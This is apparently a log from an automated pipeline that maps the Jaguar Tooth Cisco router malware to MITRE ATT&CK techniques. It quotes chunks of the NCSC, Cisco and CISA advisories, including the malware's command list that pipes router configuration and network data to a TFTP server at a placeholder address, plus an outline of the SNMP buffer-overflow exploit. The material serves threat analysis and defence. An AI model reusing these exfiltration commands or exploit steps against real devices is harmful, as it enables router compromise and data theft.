[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This vulnerability causes a stack -based  buffer to be  overflowed , enabling control of the instruction \npointer  which can be used to  gain remote code execu tion.\n\nThis exploit uses Return Oriented \nProgramming (ROP) to overwrite operating system memory  and incrementally deploy the malware \ncode over hundreds of iterations .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory.Determining the Cisco IOS Software ReleaseTo determine which Cisco\xa0IOS Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.')]
[2025-03-27 12:07:28,381 INFO] ++ Pre-conditions computed for action: Modify System Image: Patch System Image as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This vulnerability causes a stack -based  buffer to be  overflowed , enabling control of the instruction \npointer  which can be used to  gain remote code execu tion.\n\nThis exploit uses Return Oriented \nProgramming (ROP) to overwrite operating system memory  and incrementally deploy the malware \ncode over hundreds of iterations .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='Successful exploitation could allow an authenticated, remote attacker toexecute arbitrary codeand obtain full control of the affected system or cause the affected system to reload.In the 2021 campaign detailed by the NCSC, threat actors exploited CVE-2017-6742 to perform reconnaissance, enumerate router interfaces and deploy custom malware known as "Jaguar Tooth", as detailed in theNCSC’s Jaguar Tooth malware analysis report.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.')]
[2025-03-27 12:07:42,686 INFO] ++ Post-conditions computed for action: Modify System Image: Patch System Image as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This vulnerability causes a stack -based  buffer to be  overflowed , enabling control of the instruction \npointer  which can be used to  gain remote code execu tion.\n\nThis exploit uses Return Oriented \nProgramming (ROP) to overwrite operating system memory  and incrementally deploy the malware \ncode over hundreds of iterations .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='Successful exploitation could allow an authenticated, remote attacker toexecute arbitrary codeand obtain full control of the affected system or cause the affected system to reload.In the 2021 campaign detailed by the NCSC, threat actors exploited CVE-2017-6742 to perform reconnaissance, enumerate router interfaces and deploy custom malware known as "Jaguar Tooth", as detailed in theNCSC’s Jaguar Tooth malware analysis report.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.')]
[2025-03-27 12:07:46,584 INFO] ++ Indicators computed for action: Modify System Image: Patch System Image as used by the malware. The indicators are:
['The content contains "| 03   81   60   00   0 8 |".', 'The content contains "| 24   02   00   0 1 |".']
[2025-03-27 12:07:58,558 INFO] Processing step relative to tactic: discovery
[2025-03-27 12:07:58,558 INFO] + Processing action: Remote System Discovery as used by the malware
[2025-03-27 12:08:00,117 INFO] ++ Embedding computed for: Remote System Discovery as used by the malware. The vector has shape: (384,)
[2025-03-27 12:08:00,131 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery]: tensor([[0.4000]])
[2025-03-27 12:08:00,142 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: local account]: tensor([[0.4239]])
[2025-03-27 12:08:00,155 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.3558]])
[2025-03-27 12:08:00,170 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: email account]: tensor([[0.2854]])
[2025-03-27 12:08:00,184 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.2990]])
[2025-03-27 12:08:00,198 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [application window discovery]: tensor([[0.4494]])
[2025-03-27 12:08:00,213 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [browser information discovery]: tensor([[0.3649]])
[2025-03-27 12:08:00,224 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.3565]])
[2025-03-27 12:08:00,238 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.2476]])
[2025-03-27 12:08:00,255 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud service discovery]: tensor([[0.3668]])
[2025-03-27 12:08:00,267 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.3665]])
[2025-03-27 12:08:00,279 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3559]])
[2025-03-27 12:08:00,292 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [debugger evasion]: tensor([[0.3478]])
[2025-03-27 12:08:00,306 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [device driver discovery]: tensor([[0.5098]])
[2025-03-27 12:08:00,323 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [domain trust discovery]: tensor([[0.3222]])
[2025-03-27 12:08:00,337 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [file and directory discovery]: tensor([[0.4278]])
[2025-03-27 12:08:00,351 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [group policy discovery]: tensor([[0.3578]])
[2025-03-27 12:08:00,363 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [log enumeration]: tensor([[0.4096]])
[2025-03-27 12:08:00,374 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [network service discovery]: tensor([[0.6064]])
[2025-03-27 12:08:00,385 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [network share discovery]: tensor([[0.4070]])
[2025-03-27 12:08:00,398 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [network sniffing]: tensor([[0.3567]])
[2025-03-27 12:08:00,413 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [password policy discovery]: tensor([[0.3160]])
[2025-03-27 12:08:00,424 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.4915]])
[2025-03-27 12:08:00,436 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery]: tensor([[0.4073]])
[2025-03-27 12:08:00,447 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.4116]])
[2025-03-27 12:08:00,459 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3591]])
[2025-03-27 12:08:00,472 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3267]])
[2025-03-27 12:08:00,484 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [process discovery]: tensor([[0.4979]])
[2025-03-27 12:08:00,495 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [query registry]: tensor([[0.4540]])
[2025-03-27 12:08:00,507 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [remote system discovery]: tensor([[0.6322]])
[2025-03-27 12:08:00,517 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [software discovery]: tensor([[0.5100]])
[2025-03-27 12:08:00,530 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.5404]])
[2025-03-27 12:08:00,543 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system information discovery]: tensor([[0.5413]])
[2025-03-27 12:08:00,553 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system location discovery]: tensor([[0.4928]])
[2025-03-27 12:08:00,566 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.5030]])
[2025-03-27 12:08:00,578 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.5983]])
[2025-03-27 12:08:00,596 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.5489]])
[2025-03-27 12:08:00,609 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.5912]])
[2025-03-27 12:08:00,630 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network connections discovery]: tensor([[0.6069]])
[2025-03-27 12:08:00,646 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.4961]])
[2025-03-27 12:08:00,657 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system service discovery]: tensor([[0.5432]])
[2025-03-27 12:08:00,668 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system time discovery]: tensor([[0.3879]])
[2025-03-27 12:08:00,683 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3307]])
[2025-03-27 12:08:00,698 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3393]])
[2025-03-27 12:08:00,714 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3415]])
[2025-03-27 12:08:00,726 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.2459]])
[2025-03-27 12:08:00,727 INFO] ++ Scores: [('remote system discovery', tensor([[0.6322]])), ('system network connections discovery', tensor([[0.6069]])), ('network service discovery', tensor([[0.6064]])), ('system network configuration discovery', tensor([[0.5983]])), ('system network configuration discovery: wi-fi discovery', tensor([[0.5912]]))]
[2025-03-27 12:08:00,728 INFO] ++ Similar techniques found:
['remote system discovery', 'system network connections discovery', 'network service discovery', 'system network configuration discovery', 'system network configuration discovery: wi-fi discovery']
[2025-03-27 12:08:00,728 INFO] ++ Querying the QA model for action Remote System Discovery as used by the malware with the following context:
remote system discovery
system network connections discovery
network service discovery
system network configuration discovery
system network configuration discovery: wi-fi discovery
[2025-03-27 12:08:01,381 INFO] ++ QA suggested technique: remote system discovery
[2025-03-27 12:08:01,381 INFO] ++ Selected technique: remote system discovery
[2025-03-27 12:08:05,534 INFO] ++ Refining the action: Remote System Discovery as used by the malware using 9 documents:
[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Exceptions may be present in the documentation due to language that is hardcoded in the user interfaces of the product software, language used based on RFP documentation, or language that is used by a referenced third-party product.Learn moreabout how Cisco is using Inclusive Language.Cisco Security AdvisorySNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE SoftwareHighAdvisory ID:cisco-sa-20170629-snmpFirst\xa0Published:2017\xa0June\xa029\xa016:00\xa0GMTLast\xa0Updated:2023\xa0April\xa021\xa017:45\xa0GMTVersion\xa01.10:FinalWorkarounds:YesCisco Bug IDs:CSCsy56638CSCve54313CSCve57697More...,CSCsy56638,CSCve54313,CSCve57697,CSCve60276,CSCve60376,CSCve60402,CSCve60507,CSCve66540,CSCve66601,CSCve66658,CSCve78027,CSCve89865CVE-2017-6736CVE-2017-6737CVE-2017-6738More...CVE-2017-6736,CVE-2017-6737,CVE-2017-6738,CVE-2017-6739,CVE-2017-6740,CVE-2017-6741,CVE-2017-6742,CVE-2017-6743,CVE-2017-6744CWE-119CWE-119CVSS\xa0Score:Base 8.8, \n                                          Temporal 8.2Click Icon to Copy Verbose ScoreCVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:CCVE-2017-6736CVE-2017-6737CVE-2017-6738More...CVE-2017-6736,CVE-2017-6737,CVE-2017-6738,CVE-2017-6739,CVE-2017-6740,CVE-2017-6741,CVE-2017-6742,CVE-2017-6743,CVE-2017-6744CWE-119CWE-119Download CSAFDownload OVALCVE-2017-6744CVE-2017-6743CVE-2017-6738CVE-2017-6736CVE-2017-6740EmailSummaryThe Simple Network Management Protocol\xa0(SNMP) subsystem of Cisco IOS and IOS XE Software contains multiple vulnerabilities that could allow an authenticated, remote attacker to remotely execute code on an affected system or cause an affected system to reload.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.ConclusionAPT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.TTPs in this advisory may still be used against vulnerable Cisco devices.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='Successful exploitation could allow an authenticated, remote attacker toexecute arbitrary codeand obtain full control of the affected system or cause the affected system to reload.In the 2021 campaign detailed by the NCSC, threat actors exploited CVE-2017-6742 to perform reconnaissance, enumerate router interfaces and deploy custom malware known as "Jaguar Tooth", as detailed in theNCSC’s Jaguar Tooth malware analysis report.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6.\n\nOnly traffic directed to the affected system can be used to exploit these vulnerabilities.To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.')]
[2025-03-27 12:08:28,249 INFO] ++ Pre-conditions computed for action: Remote System Discovery as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  